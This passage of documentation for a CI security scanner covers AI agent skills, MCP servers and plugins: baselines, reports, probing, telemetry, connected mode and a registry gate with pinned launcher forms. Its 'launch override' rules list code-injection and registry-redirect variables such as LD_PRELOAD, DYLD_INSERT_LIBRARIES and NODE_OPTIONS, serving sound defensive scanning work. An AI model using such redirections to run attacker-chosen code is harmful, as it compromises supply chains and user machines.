    expires: 2027-01-31
```

An entry accepts one finding, by fingerprint, from `added` to `expires`. It needs a reason, may last at most 365 days, and at most 30 days for a malicious-indicator rule (SW-SKL-004, SW-SKL-008, SW-CFG-006, SW-CFG-007). An invalid entry accepts nothing and fails the scan (exit 2); an expired one stops accepting, and the report says which entry expired on which date. Accepted findings stay in every report, marked as accepted with their reason. `spellwarden baseline add --all --reason "..."` accepts every current finding (90 days by default), `prune` removes entries that no longer match anything, `list` shows each entry's state. These three commands work on the files in your working tree. They scan without a connection, so they cannot see an `SW-REG` or `SW-ORG` finding: `prune` keeps an entry that names such a rule until it has expired (and 30 more days), `list` shows it as `connected` instead of `unmatched`, and to accept one you give its fingerprint from a connected report with `--rule` (and `--finding-path`): `spellwarden baseline add --fingerprint FP --rule SW-REG-001 --finding-path skills/setup --reason "..."`, at most 90 days for `SW-REG` and 365 for `SW-ORG`.

On a pull or merge request the scan reads the baseline from the base revision, like the settings file (see "Settings"): a request cannot accept its own finding. To accept a finding that a request introduces, merge the baseline entry first, in a request of its own; an entry that matches nothing yet is valid.

### Reports

`--format` may be given several times, each followed by its own `--output` (stdout when omitted, one format at most). Every report is byte-identical for the same files, settings and `--as-of` date, holds no timestamp and no absolute path, and is sorted.

| Format | For |
|---|---|
| `text` (default) | a terminal |
| `json` | tools; the shape is `schemas/report.schema.json` |
| `sarif` | GitHub code scanning (SARIF 2.1.0, one fingerprint per result under `partialFingerprints["spellwarden/v1"]`, accepted findings as `suppressions`) |
| `markdown` | the job summary and the pull or merge request comment (starts with `<!-- spellwarden-scan -->`, at most 60,000 characters) |
| `gitlab-codequality` | the GitLab Code Quality report (critical, high, medium and low become critical, major, minor and info) |

Paths are relative to the scan root, except in SARIF and Code Quality, where they are relative to the repository root, because that is where GitHub and GitLab resolve them.

### Probing MCP servers: `--probe`

Off by default. With `--probe`, the scanner sends the unauthenticated MCP probe of the hosted product to every remote server of an MCP configuration whose URL is `https://`, from your machine or runner, and adds the `SW-MCP` findings and the 2026-07-28 migration checklist to the report. It sends the URL and the protocol's own requests only: never a header, environment value or argument from the configuration, never an `Authorization` header or a cookie. Addresses must be public; at most 50 servers, 4 at a time, 300 requests and 120 seconds for the whole run. A URL holding a `${...}` reference is not probed. `--probe` is switched off on a pull or merge request from a fork or from Dependabot.

`--probe-private` (or `SPELLWARDEN_PROBE_PRIVATE=true`) also allows the private addresses of the configured servers themselves (never a link-local address such as the cloud metadata service, and never an address that a server's answer or redirect points to), but only on a local run or on a push, schedule or manual run of a protected branch or tag in GitHub Actions or GitLab CI; anywhere else it is ignored with the notice `probe_private_untrusted`, because whoever can push a revision controls the endpoints it names. It cannot be set in `.spellwarden/config.yml`.

### The usage ping

In CI, and only in CI, each `spellwarden scan` sends one request at the end to `https://dash.spellwarden.ai/api/public/ping`. It lets us count how many organisations run the free scanner. The ping is pseudonymous, not anonymous, and carries exactly five fields:

| Field | Value |
|---|---|
| `schema` | `1` |
| `version` | the scanner version |
| `rules_version` | the rules version |
| `ci` | `github`, `gitlab` or `other` |
| `org` | a SHA-256 hash of the installation identity, or `null` |

The installation identity is the forge host plus the GitHub account's numeric id (`github:github.com:1234567`), the GitLab top-level group's path (`gitlab:gitlab.com:acme`), or the owner in the `origin` remote elsewhere. It is hashed as `sha256("spellwarden-ping-v1:" + identity)`. Anyone who knows an identity can compute its hash, which is why we call it pseudonymous. One company on GitHub and on GitLab is two identities; a self-managed GitLab or GitHub Enterprise Server is its own; renaming a GitLab top-level group starts a new one. The identity cannot be joined to an organisation of the hosted product.

The server keeps one row per hashed identity and ISO week: the number of runs, the first and last time seen, the last scanner and rules versions and the CI kind. The row holds no IP address and no user agent, and is deleted 400 days after the end of its week. To limit abuse, the rate limiter keeps the sending address for one hour. Like every request to the service, the ping also appears in the technical logs, kept for 90 days, with the address it arrived from (usually one of the content delivery network's). No repository content is ever sent, and nothing is sent from a local run or by `lock`, `baseline`, `rules` or `version`.

Switch it off with any of: `--no-telemetry`, `SPELLWARDEN_TELEMETRY=off` (or `0`, `false`, `no`), `DO_NOT_TRACK=1`, `telemetry: false` in `.spellwarden/config.yml`, or the `telemetry: false` input of the Action or the GitLab component. A failed or slow ping never changes a report or an exit code.

### Connected mode

Connected mode links a scan to a Spellwarden organisation. The organisation's CI policy decides which rules and which policy pack the run applies, the registry gate (Enterprise) fails a run that adds or changes a skill, MCP server, plugin or marketplace the private registry does not admit, and the results go to the Repositories page of the dashboard. It needs a Team plan (a trial counts); the gate needs the Enterprise plan. Without a credential, without `SPELLWARDEN_ORG` and without `connected.required` the command is the free scanner of every section above, unchanged apart from the rules version and the three gate rules in the rules table. A `connected:` key in `.spellwarden/config.yml` is refused by a 1.0 or 1.1 scanner, so requiring connected mode presupposes 1.2.0 everywhere the repository is scanned.

#### Turning it on

There are two credentials, and a run uses one of them. Both set is the error `connected_config`.

- **A CI connection** (recommended). An administrator adds a CI connection for your GitHub account or organisation, or your GitLab group, under Settings, CI connections. The pipeline then proves who it is with the OIDC token its code host issues, and nothing secret is stored in the repository. Set `SPELLWARDEN_ORG` to the organisation's slug (`^[a-z0-9-]{2,64}$`, the part of the dashboard address after `dash.spellwarden.ai/`). On GitHub the job needs `permissions: id-token: write`, and the command asks the Actions token endpoint itself for a token whose audience is `https://dash.spellwarden.ai/ci/<slug>`. On GitLab the job declares `id_tokens` with that audience and passes it as `SPELLWARDEN_ID_TOKEN`. The GitHub Action takes the slug as its `org` input and the GitLab component as its `org` input.
- **A CI key.** For a pipeline that cannot use a CI connection, create a key with access CI under Settings, API keys, and pass it as the secret `SPELLWARDEN_API_KEY` (`swk_` and 40 characters). The key is a secret that every workflow of the repository can read, which a CI connection avoids. Results uploaded with a key are shown as reported with a CI key: they are not the repository's attested state and do not count in the trust score. The first upload binds the repository to the key; after the old key is revoked, the next upload rebinds it. A key for read or write access, a connector token (`swc_`) or a CI token (`swt_`) is refused.

The command reads these variables once, keeps them as secrets that print as `***`, removes them from its environment, and gives every program it starts an explicit environment. There is no flag and no settings key for a credential, and no message, report or upload body ever holds one.

```yaml
# .spellwarden/config.yml
connected:
  pack: 3f2a0c9d4b7e4d1f8a6b5c2e9d0f1a37@1.4   # optional: a pack id (baseline or 32 hex), optionally @version, from the organisation's allowed list
  upload: true                                  # optional, default true: upload the results in CI
  required: false                               # optional, default false: a run that cannot connect exits 2 instead of falling back to free mode
```

`upload` has the flags `--upload` and `--no-upload` and the variable `SPELLWARDEN_UPLOAD`; a flag wins over the variable, which wins over the file. `pack` and `required` are the repository's statement: they have no flag and no variable, and on a pull or merge request they are read from the base revision's `.spellwarden/config.yml`, even when `--config FILE` names another file (the notice `settings_from_base` says so). `--as-of` is refused in connected mode, because the server works out when baseline entries expire. In free mode the `connected` mapping is read, validated and ignored.

#### What is sent

Only these leave the runner: the token request to your code host, the exchange, the session and policy requests, the registry check and the upload. No whole file is ever sent. A finding carries an excerpt of at most 300 characters of the matched line, with credentials masked. An MCP server's address leaves only as a hash, and the link that asks for its admission carries the address without user name, query or fragment.

- The exchange sends the organisation slug, the code host's OIDC token (once, to be verified; it is not stored) and the display fields of the run: the scan root, the pull request number, the head commit and the default branch.
- The registry check sends, for each item in scope, its path, line, name and identity: a skill's package hash, a server's address hash, the pinned form of a stdio command, a plugin's or marketplace's repository URL and commit.
- The upload sends the run (repository, scope, kind, event, commits, branch names, run link) and the JSON report, reduced: no `connected.upload`, no probe findings or checklist, at most 50 notices and 50 errors with messages masked and cut to 300 characters, and the caps the organisation's policy states for findings (500, the highest severity first, accepted ones included with their baseline entry), items (2000) and probes (200). If the body is still over its limit, items, then probes, then the lowest findings are dropped. Every cut is recorded in the report's `upload_truncated` and `upload_truncated_fields`.

#### The calls

At most six requests and their retries, all to `https://dash.spellwarden.ai/api` (or your proxy, see "Proxies"). The Spellwarden API accepts HTTPS only, resolves the host and uses public addresses only, and follows no redirect.

| Call | When |
|---|---|
| `GET $ACTIONS_ID_TOKEN_REQUEST_URL&audience=...` | the OIDC token, on GitHub, to your code host's own token endpoint |
| `POST /public/ci/token` | the exchange of that token for a CI token that lasts 15 minutes |
| `GET /orgs` | with a CI key: the organisation the key belongs to, which must hold the CI access |
| `GET /orgs/{slug}/ci/policy` | the CI policy: rules or pack, the gate's posture, the registry name, the limits |
| `POST /orgs/{slug}/ci/registry-check` | the items in scope, only when there is one the gate can identify |
| `POST /orgs/{slug}/ci/scans` | the results, after the exit code is decided and before any output file is written |

Each request has 10 seconds including its body and may answer at most 2 MiB. A 429 is retried once after `Retry-After` (at most 20 seconds); a connection failure before the request was sent, or a 5xx, is retried once after 2 seconds. The upload is not retried after a timeout, because it may still be running. The calls share a budget of 150 seconds counted as time spent inside requests and their waits; the scan, the probes and the organisation rules do not count. A request that would start more than 840 seconds after the exchange is `connected_unavailable`, because the CI token's fifteen minutes are over.

After the first authenticated answer, every failure exits 2, whatever `connected.required` says: an organisation whose pipelines reached Spellwarden has set connected mode up, and an outage then is an incomplete scan, never a pass. An upload that fails is only a notice and never changes the exit code.

#### Run kinds and which events report

The command classes each run:

| Kind | When | Uploaded |
|---|---|---|
| `request` | a pull or merge request (GitHub `pull_request`, `pull_request_target`, `merge_group`; GitLab `merge_request_event`) | yes |
| `default_branch` | a push, schedule or manual run on the default branch (any run of other CI whose branch is `SPELLWARDEN_DEFAULT_BRANCH`) | yes |
| `branch` | any other run | no (the notice `upload_skipped`, reason `branch`) |

The default branch is `SPELLWARDEN_DEFAULT_BRANCH` when set (the Action fills it from the repository or its `default-branch` input), else the event payload's, else GitLab's `CI_DEFAULT_BRANCH`. The server decides in the end and may answer that a run is not reportable: `event_not_reportable` (a `workflow_run` or `issue_comment` run is treated as a request for its settings and gate, but a two-stage workflow that wants results in the dashboard runs the Action in the first stage), `default_branch_unconfirmed` (the repository's default branch is not confirmed yet in the dashboard) or `branch`. Only a CI token's default-branch run changes what the dashboard shows as the repository's current state; a run with a CI key is a key report. In other CI the upload needs a run id: set `SPELLWARDEN_RUN_ID`, or the upload is skipped with the reason `no_run_id`.

#### Pull requests from forks: the two-job recipe

GitHub gives a pull request from a fork no secrets and no OIDC token. A `pull_request` run from a fork is therefore `connected_no_credential`, and `connected.required` decides (see below); if a key is present anyway it is ignored with the notice `fork_free_mode`. To scan outside contributions with the organisation's policy, use two jobs, so that each request is scanned once, by the job that has a credential. The second job runs on `pull_request_target`, with the base repository's secrets and token: check out the head commit with `persist-credentials: false`, run nothing but the Spellwarden Action, and grant only these permissions. The command treats `pull_request_target` as a request of the base repository, never as a fork run: it connects, gates and uploads, takes `head_sha` and `head_ref` from the event payload, and pins `head_sha` in the request links.

```yaml
on:
  pull_request:
  pull_request_target:
jobs:
  same-repository:
    if: github.event_name == 'pull_request' && github.event.pull_request.head.repo.full_name == github.repository
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write
      pull-requests: write
    steps:
      - uses: actions/checkout@<commit>
        with:
          fetch-depth: 0
      - uses: spellwarden-ai/scan@<commit of v1.2.0>  # v1.2.0
        with:
          org: acme
  outside-contribution:
    if: github.event_name == 'pull_request_target' && github.event.pull_request.head.repo.full_name != github.repository
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write
      pull-requests: write
    steps:
      - uses: actions/checkout@<commit>
        with:
          ref: ${{ github.event.pull_request.head.sha }}
          persist-credentials: false
      - uses: spellwarden-ai/scan@<commit of v1.2.0>  # v1.2.0
        with:
          org: acme
```

Dependabot pull requests run in the `same-repository` job and use the exemption below. On GitLab, a merge request whose pipeline runs in a fork's project carries the fork's identity, which no CI connection names unless it lists the fork, so `connected.required` decides. A pipeline run in the parent project for a merge request from a fork is refused at the exchange (`fork_pipeline_unsupported`), see "Unsupported setups".

#### The gate

The gate runs when the organisation's plan has a private registry and its CI policy has the gate on (the default). With the gate off the notice `registry_gate_off` says so; on a plan without a registry nothing is said. The CI policy sets the posture: `scope` (`changed` or `all`), and whether stdio servers and plugins are judged.

| Kind | Judged | Identity |
|---|---|---|
| Skill | every skill package the scan found | the hash of its files (`package_sha256`) |
| Remote MCP server | every server with an `http` or `sse` transport | the hash of its normalised address, query included |
| Stdio MCP server | every `command` server, when the policy judges stdio | the pinned form of the launch, `cmd:...` |
| Plugin | every entry of the repository's own `marketplace.json` with a remote source, when the policy judges plugins | `git:<repository URL>@<commit>` |
| Marketplace | every `extraKnownMarketplaces` declaration of `.claude/settings.json`, when the policy judges plugins; the `enabledPlugins` entries naming it are listed under it | `git:<repository URL>@<commit>` |

An entry that is neither (a server with neither `command` nor `url`, a plugin with a local path as its source) is not judged. An `enabledPlugins` entry whose marketplace is not declared in the repository is listed with the notice `plugin_marketplace_unknown`: the marketplace lives in the user's own settings, which no repository scan sees.

**Scope.** On a request with `scope: changed`, the gate judges what the request added or changed, computed without needing a merge base: a skill when any path under it, or any file one of its followed links points at, changed; a server, stdio entry, plugin or marketplace when its configuration document changed and the base revision's version of that document holds no entry with the same identity (or, for an entry that cannot be identified, the same entry hash); a stdio entry also when a resolver file of its launcher family changed; a marketplace also when an `enabledPlugins` entry under it is new. A new document puts all its entries in scope. On GitHub `pull_request`, when the checkout is the test merge commit, the diff is against its first parent. In every other case, a workflow that checks out the head commit included, the diff is the two-dot `git diff --name-only <base> HEAD`, so a checkout of the head commit compares against the base tip, and files changed on the base branch since the branch point are in scope too. The gate fails closed, so the wider set is safe. Use `fetch-depth: 0` to make the diff cheaper. When the base cannot be read, every item is in scope with the notice `gate_scope_all`. Default-branch runs, other branch runs and `scope: all` judge everything; items out of scope are counted in `registry.out_of_scope` and never become findings on that run, and the default-branch run reports them.

**The check.** One call sends the items in scope that could be identified. Each item the registry does not admit becomes an `SW-REG-001` finding (skill, plugin, marketplace) or `SW-REG-002` finding (server, stdio) at the item's location, severity high, with a link to request its admission in the Markdown report (the section "Not admitted in the private registry"). Each item in scope that could not be identified becomes an `SW-REG-003` finding without any call. With no identifiable item in scope no call is made. If the check cannot be made or answered, the run exits 2 with `registry_check_failed` and writes no `SW-REG` finding.

**Pinned command forms.** A stdio server is identified when it launches one of `npx`, `bunx`, `pnpm dlx`, `uvx`, `pipx run` or `docker run` with every package at an exact version (`npx -y @acme/mcp-fs@1.2.3`, `uvx mcp-server-git==0.6.2`, `pipx run --spec pkg==1.0.0 pkg`, an image as `name@sha256:<64 hex>`). The identity is `cmd:<launcher> <packages>`, then ` src=<registries>` when the launch names a registry or index, then ` args=<32 hex>` when it has any other argument. Before the package or image, every option must be one the launcher is known to take: its quiet flags, its known on/off flags (`npx --ignore-scripts`, `uvx --no-cache`, `docker run --privileged`; the table below lists every one per launcher), its value options, or its registry and index options. A bare `--` ends the launcher's options: the next token is the package. Quiet flags (`-y`, `--yes`, `-q`, `--quiet`, `--silent` for the package launchers; `--rm`, `-i`, `-t`, `--init`, `--name` for Docker) are dropped; the known on/off flags, the value options and every argument after the package go into the hash, and a registry is reduced to scheme, host and path. Any other option, an unknown option written as `--opt=value`, or a cluster of short flags with a letter the scanner does not know leaves the launch unidentifiable, with the reason `unresolved`. The names of the keys in the entry's `env` go into the hash as well (sorted, so an environment variable changes the identity), and their values never do. Pass index credentials through the launcher's credential store, never on the command line: a credential in the command line would be an argument, and it is never uploaded or put in a link, but it would make the launch differ from run to run.

The options accepted before the package or image are exactly these, per launcher. A `-` followed by several letters is read letter by letter, and every letter must be in the launcher's quiet, on/off, value, artefact or registry rows. The overrides row gives a `launch_override` in the `--opt value` and the `--opt=value` form (`pnpm dlx` also refuses any option starting with `--config.`, shown as `--config.<key>`). A test checks this table against the scanner's own lists.

| Launcher | Kind | Options |
| --- | --- | --- |
| `npx` | Quiet flags (dropped) | `-q`, `--quiet`, `--silent`, `-y`, `--yes` |
| `npx` | On/off flags (hashed) | `-d`, `--dangerously-allow-all-scripts`, `-f`, `--force`, `--foreground-scripts`, `--ignore-scripts`, `--include-workspace-root`, `--json`, `--legacy-peer-deps`, `--no`, `--no-audit`, `--no-fund`, `--no-package-lock`, `--no-progress`, `--no-update-notifier`, `--offline`, `--prefer-offline`, `--prefer-online`, `-s`, `--strict-allow-scripts`, `--strict-peer-deps`, `--workspaces` |
| `npx` | Value options (hashed) | `-C`, `-c`, `--cache`, `--call`, `--loglevel`, `--node-arg`, `--prefix`, `-w`, `--workspace` |
| `npx` | Artefact options | `-p`, `--package` |
| `npx` | Registry and index options | `--default-index`, `--extra-index-url`, `--find-links`, `--index`, `--index-url`, `--registry` |
| `npx` | Overrides (launch override) | `--globalconfig`, `--node-options`, `--script-shell`, `--userconfig` |
| `bunx` | Quiet flags (dropped) | `-q`, `--quiet`, `--silent`, `-y`, `--yes` |
| `bunx` | On/off flags (hashed) | `-b`, `--bun`, `--force`, `--no-cache`, `--no-install`, `--no-summary`, `--verbose` |
| `bunx` | Artefact options | `-p`, `--package` |
| `bunx` | Registry and index options | `--default-index`, `--extra-index-url`, `--find-links`, `--index`, `--index-url`, `--registry` |
| `bunx` | Overrides (launch override) | `--globalconfig`, `--node-options`, `--script-shell`, `--userconfig` |
| `pnpm dlx` | Quiet flags (dropped) | `-q`, `--quiet`, `--silent`, `-y`, `--yes` |
| `pnpm dlx` | On/off flags (hashed) | `-c`, `--ignore-scripts`, `--no-color`, `--offline`, `--prefer-offline`, `--shell-mode`, `--use-stderr` |
| `pnpm dlx` | Artefact options | `-p`, `--package` |
| `pnpm dlx` | Registry and index options | `--default-index`, `--extra-index-url`, `--find-links`, `--index`, `--index-url`, `--registry` |
| `pnpm dlx` | Overrides (launch override) | `--globalconfig`, `--node-options`, `--script-shell`, `--userconfig`, `--config.<key>` |
| `uvx` | Quiet flags (dropped) | `-q`, `--quiet`, `--silent`, `-y`, `--yes` |
| `uvx` | On/off flags (hashed) | `--compile-bytecode`, `--isolated`, `--lfs`, `--managed-python`, `-n`, `--no-binary`, `--no-build`, `--no-build-isolation`, `--no-cache`, `--no-config`, `--no-env-file`, `--no-index`, `--no-managed-python`, `--no-progress`, `--no-python-downloads`, `--no-sources`, `--offline`, `--refresh`, `--reinstall`, `--system-certs`, `-U`, `--upgrade`, `-v`, `--verbose` |
| `uvx` | Value options (hashed) | `--allow-insecure-host`, `-b`, `--build-constraints`, `-C`, `-c`, `--cache-dir`, `--color`, `--config-setting`, `--config-settings-package`, `--constraints`, `--exclude-newer`, `--exclude-newer-package`, `--fork-strategy`, `--index-strategy`, `--keyring-provider`, `--link-mode`, `--no-binary-package`, `--no-build-isolation-package`, `--no-build-package`, `--no-sources-package`, `--overrides`, `-P`, `-p`, `--prerelease`, `--python`, `--python-platform`, `--python-preference`, `--refresh-package`, `--reinstall-package`, `--resolution`, `--torch-backend`, `--upgrade-group`, `--upgrade-package`, `--with-editable`, `--with-requirements` |
| `uvx` | Artefact options | `--from`, `-w`, `--with` |
| `uvx` | Registry and index options | `--default-index`, `--extra-index-url`, `-f`, `--find-links`, `-i`, `--index`, `--index-url`, `--registry` |
| `uvx` | Overrides (launch override) | `--config-file`, `--directory`, `--env-file`, `--project` |
| `pipx run` | Quiet flags (dropped) | `-q`, `--quiet`, `--silent`, `-y`, `--yes` |
| `pipx run` | On/off flags (hashed) | `--fetch-missing-python`, `--no-cache`, `--pypackages`, `--system-site-packages`, `--verbose` |
| `pipx run` | Value options (hashed) | `--path`, `--python` |
| `pipx run` | Artefact options | `--spec` |
| `pipx run` | Registry and index options | `--default-index`, `--extra-index-url`, `--find-links`, `--index`, `--index-url`, `--registry` |
| `pipx run` | Overrides (launch override) | `--pip-args` |
| `docker run` | Quiet flags (dropped) | `-i`, `--init`, `--interactive`, `--name`, `--rm`, `-t`, `--tty` |
| `docker run` | On/off flags (hashed) | `-d`, `--detach`, `--no-healthcheck`, `--oom-kill-disable`, `-P`, `--privileged`, `--publish-all`, `-q`, `--quiet`, `--read-only`, `--sig-proxy`, `--use-api-socket` |
| `docker run` | Value options (hashed) | `-a`, `--add-host`, `--annotation`, `--attach`, `--blkio-weight`, `--blkio-weight-device`, `-c`, `--cap-add`, `--cap-drop`, `--cgroup-parent`, `--cgroupns`, `--cidfile`, `--cpu-period`, `--cpu-quota`, `--cpu-rt-period`, `--cpu-rt-runtime`, `--cpu-shares`, `--cpus`, `--cpuset-cpus`, `--cpuset-mems`, `--detach-keys`, `--device`, `--device-cgroup-rule`, `--device-read-bps`, `--device-read-iops`, `--device-write-bps`, `--device-write-iops`, `--dns`, `--dns-option`, `--dns-search`, `--domainname`, `-e`, `--env`, `--env-file`, `--expose`, `--gpus`, `--group-add`, `-h`, `--health-cmd`, `--health-interval`, `--health-retries`, `--health-start-interval`, `--health-start-period`, `--health-timeout`, `--hostname`, `--ip`, `--ip6`, `--ipc`, `--isolation`, `--kernel-memory`, `-l`, `--label`, `--label-file`, `--link`, `--link-local-ip`, `--log-driver`, `--log-opt`, `-m`, `--mac-address`, `--memory`, `--memory-reservation`, `--memory-swap`, `--memory-swappiness`, `--mount`, `--network`, `--network-alias`, `--oom-score-adj`, `-p`, `--pid`, `--pids-limit`, `--platform`, `--publish`, `--pull`, `--restart`, `--runtime`, `--security-opt`, `--shm-size`, `--stop-signal`, `--stop-timeout`, `--storage-opt`, `--sysctl`, `--tmpfs`, `-u`, `--ulimit`, `--user`, `--userns`, `--uts`, `-v`, `--volume`, `--volume-driver`, `--volumes-from`, `-w`, `--workdir` |
| `docker run` | Overrides (launch override) | `--entrypoint` |

**Plugins and marketplaces.** A plugin or marketplace is identified when its source is a GitHub repository or a URL that names a full 40-character commit (`sha`, or a `ref` that is one). Admitting a marketplace at a commit admits the catalogue at that commit.

**The baseline.** An `SW-REG` finding may be accepted in `.spellwarden/baseline.yml` for at most 90 days, a third cap next to 365 and 30. On a request, `SW-REG` entries are honoured only from the base revision's baseline, even when `--baseline FILE` points elsewhere (the notice `reg_baseline_from_base`). The fingerprint of an `SW-REG-003` finding binds the acceptance to the entry as it stands: a second unpinned entry in the same file, a changed resolver file or an edited unhashable skill is a new finding.

##### Gate reason: unhashable

A skill's package cannot be hashed the way the registry hashes a forge archive of it: a `node_modules`, `.venv`, `venv` or `__pycache__` directory is under it, the walk skipped such a directory, `include` or `exclude` in the settings drops one of its files, one of its links could not be followed, or a file under it has the git attribute `export-ignore` or `export-subst`. The finding names the first offending path. Remove the directory or the attribute, keep every file of the skill in the scan, or accept the finding in the baseline.

##### Gate reason: unresolved

The address or the command holds a `${...}` reference, or the address cannot be read (a port out of range, control characters), so its identity would differ on every machine. Write the value out. The same reason applies when an option before the package or image is not one the launcher is known to take (an unknown flag, an unknown `--opt=value`, a cluster of short flags with a letter the scanner does not know): remove the option, or ask for it to be listed.

##### Gate reason: insecure

The server's address starts with `http://`. This is also `SW-CFG-001`. Use `https://`.

##### Gate reason: unpinned

A package is given as a range, a tag, `latest` or without a version, or a plugin or marketplace is not pinned to a full commit. Pin an exact version (or a full commit, or an image digest).

##### Gate reason: unknown launcher

The command is not one of the recognised launchers (`node server.js`, `python -m x`, a path to a program). The registry can admit only a launch it can pin. Launch the server through a pinned `npx`, `uvx` or `docker run` form.

##### Gate reason: launch override

The launch changes what the launcher runs or where it fetches from: `docker run --entrypoint`; for `npx`, `bunx` and `pnpm dlx`, the options `--userconfig`, `--globalconfig`, `--node-options` and `--script-shell` (in the `--opt value` and the `--opt=value` form) and, for `pnpm dlx`, any `--config.<key>` option; for `uvx`, `--config-file`, `--env-file`, `--directory` and `--project`; for `pipx run`, `--pip-args`; or an `env` entry in the list of names that redirect a launcher (`NODE_OPTIONS`, `NODE_PATH`, `PYTHONPATH`, `PYTHONSTARTUP`, `PYTHONHOME`, `PYTHONUSERBASE`, `LD_PRELOAD`, `LD_LIBRARY_PATH`, `DYLD_INSERT_LIBRARIES`, `DYLD_LIBRARY_PATH`, `UV_INDEX`, `UV_INDEX_URL`, `UV_DEFAULT_INDEX`, `UV_EXTRA_INDEX_URL`, `UV_FIND_LINKS`, `PIP_INDEX_URL`, `PIP_EXTRA_INDEX_URL`, `PIP_FIND_LINKS`, `PIPX_DEFAULT_PYTHON`, `BUN_CONFIG_REGISTRY`, `DOCKER_HOST`, `DOCKER_CONFIG`, `PATH`, `BASH_ENV`, `ENV`, `UV_CONFIG_FILE`, `PIP_CONFIG_FILE`, `DOCKER_CONTEXT`, any `npm_config_*`). Remove it from the launch.

##### Gate reason: resolver override

A file of the repository redirects package resolution for the launcher's family: `.npmrc`, `.yarnrc.yml` or `bunfig.toml` with a registry or scope registry line (`npx`, `bunx`, `pnpm dlx`), `uv.toml`, `pip.conf` or `pyproject.toml` with an index entry (`uvx`, `pipx run`). The pinned version would not say which registry serves it. Remove the redirect, or accept the finding in the baseline; a change to any resolver file is a new finding. A resolver file on a developer's own machine is not seen.

#### connected.required and the Dependabot exemption

Everything that stops the command before the first authenticated answer is one of `connected_no_credential` (a fork or Dependabot request, where GitHub withholds secrets; a job without `id-token: write`; an empty key secret), `fork_free_mode`, `connected_auth`, `connected_subscription`, `connected_ci_key_required`, `connected_rate_limited` or `connected_unavailable` on the token request, the exchange or `GET /orgs`. If the settings in force say `connected.required: true`, the run ends with exit code 2 and the error `connected_required` carrying the underlying code. Otherwise it continues in free mode with the notice `connected_fallback` ("Connected mode was not available (<code>); this run applied the baseline rules only and uploaded nothing."), and the first line of the text output says so.

`required` is the repository's statement and cannot live in the organisation's policy, because a run without a credential cannot read the policy. One exemption: a Dependabot pull request whose diff puts no item the gate would judge in scope runs in free mode with the notice `dependabot_free_mode`, so routine dependency updates do not need the `pull_request_target` job. The check assumes every kind, `scope: changed` and a registry; a base that cannot be read puts everything in scope.

#### Errors and their fixes

Every error exits 2.

| Code | What to do |
|---|---|
| `connected_config` | `SPELLWARDEN_ORG` and `SPELLWARDEN_API_KEY` are both set, the slug is not a slug, `--as-of` was given, or the scan root's path cannot be a scan root (its characters must be letters, digits, `.`, `_` and `-`). Set one credential, fix the slug, drop the flag. |
| `connected_key_invalid` | `SPELLWARDEN_API_KEY` is not a CI key. A CI key starts with `swk_`. Create one under Settings, API keys, with access CI. |
| `connected_no_credential` | This job has no OIDC token. Grant `permissions: id-token: write` on GitHub, add the `id_tokens` entry on GitLab, or use a CI key. |
| `connected_auth` | The organisation did not accept this pipeline's identity: <server message>. Check the CI connection under Settings, CI connections, or the SPELLWARDEN_API_KEY secret. |
| `connected_subscription` | The organisation's subscription is not active. Machine access is paused until billing is restored; people can still sign in. |
| `connected_ci_key_required` | Connected mode needs a CI key. Create one under Settings, API keys, with access CI. |
| `connected_forbidden` | The credential is not allowed to do this call. Check the access of the key or the CI connection. |
| `connected_rate_limited` | A Spellwarden limit, not an outage, stopped this call: <server message>. Wait for the time the message names and run again. |
| `connected_unavailable` | Connected mode is not available: the service could not be reached, answered with an error, or has no such route yet. Run again; the budget and the 840 second limit are described above. |
| `connected_required` | This repository requires connected mode (.spellwarden/config.yml) and the run could not connect: <detail>. Fix what the detail names, or set `required: false`. |
| `policy_not_found` | The pack named in .spellwarden/config.yml is not one this organisation allows for CI: <detail>. Name another pack or remove `pack`. |
| `policy_invalid` | The organisation's rules are not a valid pack, or an organisation rule cannot be compiled. Tell an administrator of the organisation; this is a defect on the service. |
| `org_rules_incomplete` | Organisation rule(s) <ids> did not finish on <path> within 10 seconds. The scan is incomplete. Simplify the rule or split the skill. |
| `registry_check_failed` | The private registry could not be checked (<code>). The scan is incomplete. Run again. |
| `registry_check_too_large` | The run has more items to check than one call may carry. Narrow the scan with `include` and `exclude`, or split the repository into scan roots. |

Rules the server left out for this scanner version are the notice `org_rules_skipped`; the exit code does not change, and the dashboard marks the scan incomplete. A pack made for newer rules than the scanner knows is applied when it validates, with the notice `policy_newer_than_scanner`. Organisation rules for MCP servers run on probed servers only: without `--probe` the notice `mcp_rules_need_probe` says so.

#### Proxies

The Spellwarden API and the token endpoint honour `HTTPS_PROXY` (or `https_proxy`) and `NO_PROXY`, with `CONNECT` and the TLS certificate verified end to end against the target host. The proxy's own address is not checked against the public-address rule, because an enterprise proxy is set by the runner's operator; a `user:password@` in the proxy address becomes `Proxy-Authorization: Basic`. Probes and the usage ping keep their own rules and ignore the proxy.

#### Line endings and archives

A package's identity is a hash over its bytes, as a forge archive of its directory holds them. The hash leaves out `.git/`, `__MACOSX/`, any `.DS_Store`, and three files the command itself reads or writes at the top of the package: `.spellwarden/lock.json`, `.spellwarden/config.yml` and `.spellwarden/baseline.yml`, so a skill at the repository root keeps its identity when the baseline that accepts it is written. Every other path under `.spellwarden/` is hashed. A checkout that rewrites line endings (Windows `core.autocrlf`) is a different package from the one the registry admitted. A forge archive is `git archive` output, which honours `export-ignore` and `export-subst`: a path under a skill with either attribute makes the skill's identity `unhashable`. Inside a work tree the command asks `git check-attr`; outside one, any `.gitattributes` under the scan root that names either attribute makes every skill unhashable.

#### The test hook

`SPELLWARDEN_API_URL` is for tests. It is honoured only for `http://127.0.0.1:<port>/<path>`, `http://[::1]:<port>/<path>` and `http://localhost:<port>/<path>`; any other value is ignored (`--verbose` says so). When it is honoured the notice `api_url_override` is always printed, and a loopback `ACTIONS_ID_TOKEN_REQUEST_URL` is honoured as well.

#### Unsupported setups

- GitHub Enterprise Server versions without Actions OIDC.
- GitLab versions before 15.7 (no `id_tokens`).
- CI systems other than GitHub and GitLab; they use a CI key.
- An issuer kind whose tokens do not have the recorded shape (the first exchange is refused with `shape_mismatch`).
- A forge whose keys rotate faster than an administrator re-pastes them, when it is not reachable from the internet.
- GitLab pipelines run in the parent project for a merge request from a fork, until such a token has been recorded.

### Schemas and compatibility

